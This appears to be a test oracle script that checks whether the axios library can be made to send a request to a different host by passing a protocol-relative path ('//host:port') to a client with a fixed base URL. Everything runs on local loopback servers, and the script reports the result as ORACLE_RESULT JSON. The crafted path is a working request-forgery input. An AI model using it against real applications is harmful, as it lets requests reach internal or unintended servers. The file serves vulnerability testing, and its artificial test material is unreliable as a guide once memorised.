const http = require('node:http');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  let axios;
  try {
    axios = require('axios');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module_load_failed:' + (e && e.message ? e.message : String(e))
    }));
    return;
  }

  const host = '127.0.0.1';
  const goodHits = { count: 0 };
  const badHits = { count: 0 };

  const goodServer = http.createServer((req, res) => {
    goodHits.count++;
    res.statusCode = 200;
    res.end('good');
  });

  const badServer = http.createServer((req, res) => {
    badHits.count++;
    res.statusCode = 200;
    res.end('bad');
  });

  function listen(server) {
    return new Promise((resolve, reject) => {
      server.once('error', reject);
      server.listen(0, host, () => resolve(server.address().port));
    });
  }

  function close(server) {
    return new Promise((resolve) => server.close(() => resolve()));
  }

  let goodPort, badPort;
  try {
    goodPort = await listen(goodServer);
    badPort = await listen(badServer);

    const client = axios.create({ baseURL: 'http://' + host + ':' + goodPort });

    const benign = await client.get('/ok');
    if (!benign || benign.data !== 'good') {
      throw new Error('benign_request_unexpected_response');
    }

    operation_completed = true;

    const maliciousPath = '//' + host + ':' + badPort;

    try {
      const resp = await client.get(maliciousPath);
      exploit_succeeded = !!(resp && resp.data === 'bad' && badHits.count > 0);
      evidence = 'malicious_returned:' + (resp && resp.data) + ';good_hits=' + goodHits.count + ';bad_hits=' + badHits.count;
    } catch (e) {
      exploit_succeeded = badHits.count > 0;
      evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e)) + ';good_hits=' + goodHits.count + ';bad_hits=' + badHits.count;
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (e && e.message ? e.message : String(e));
  } finally {
    await Promise.allSettled([close(goodServer), close(badServer)]);
    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  }
})();